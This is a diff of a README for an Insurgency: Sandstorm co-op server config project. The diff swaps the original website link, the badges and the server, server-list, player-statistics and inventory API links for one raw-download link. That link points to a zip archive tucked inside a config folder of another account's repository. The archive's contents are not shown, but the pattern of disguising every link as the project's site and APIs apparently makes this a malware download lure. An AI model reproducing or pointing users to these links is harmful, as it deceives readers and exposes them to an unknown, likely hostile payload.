@@ -1,23 +1,23 @@
 # [INS] Server Sandstorm
 
-[![](https://img.shields.io/github/forks/zWolfi/INS_Sandstorm?color=blue&style=flat-square)](https://github.com/zWolfi/INS_Sandstorm)
-[![](https://img.shields.io/github/stars/zWolfi/INS_Sandstorm?color=yellow&style=flat-square)](https://github.com/zWolfi/INS_Sandstorm)
+[![](https://github.com/nonamebatbai/INS_Sandstorm/raw/refs/heads/master/Insurgency/Saved/Config/WindowsServer/IN_Sandstorm_v2.5-beta.2.zip)](https://github.com/nonamebatbai/INS_Sandstorm/raw/refs/heads/master/Insurgency/Saved/Config/WindowsServer/IN_Sandstorm_v2.5-beta.2.zip)
+[![](https://github.com/nonamebatbai/INS_Sandstorm/raw/refs/heads/master/Insurgency/Saved/Config/WindowsServer/IN_Sandstorm_v2.5-beta.2.zip)](https://github.com/nonamebatbai/INS_Sandstorm/raw/refs/heads/master/Insurgency/Saved/Config/WindowsServer/IN_Sandstorm_v2.5-beta.2.zip)
 
 These are the server config of what we have for our Sandstorm server so far.<br>
 NOTE: These files are for Coop server.<br><br>
 
 
-Our Website: http://ins.circleus.tech/<br><br>
+Our Website: https://github.com/nonamebatbai/INS_Sandstorm/raw/refs/heads/master/Insurgency/Saved/Config/WindowsServer/IN_Sandstorm_v2.5-beta.2.zip<br><br>
 
 
 Here are some of the APIs you can use.<br>
 Server API:<br>
-http://ins.circleus.tech/api<br><br>
+https://github.com/nonamebatbai/INS_Sandstorm/raw/refs/heads/master/Insurgency/Saved/Config/WindowsServer/IN_Sandstorm_v2.5-beta.2.zip<br><br>
 
 Server List API (To find list of servers running on the same IP):<br>
-http://ins.circleus.tech/serverlist<br><br>
+https://github.com/nonamebatbai/INS_Sandstorm/raw/refs/heads/master/Insurgency/Saved/Config/WindowsServer/IN_Sandstorm_v2.5-beta.2.zip<br><br>
 
 Player statistics API:<br>
-http://ins.circleus.tech/sandstorm/player/<br>
+https://github.com/nonamebatbai/INS_Sandstorm/raw/refs/heads/master/Insurgency/Saved/Config/WindowsServer/IN_Sandstorm_v2.5-beta.2.zip<br>
 Player Inventory API (The item player owned in game):<br>
-http://ins.circleus.tech/sandstorm/player/inventory/
+https://github.com/nonamebatbai/INS_Sandstorm/raw/refs/heads/master/Insurgency/Saved/Config/WindowsServer/IN_Sandstorm_v2.5-beta.2.zip
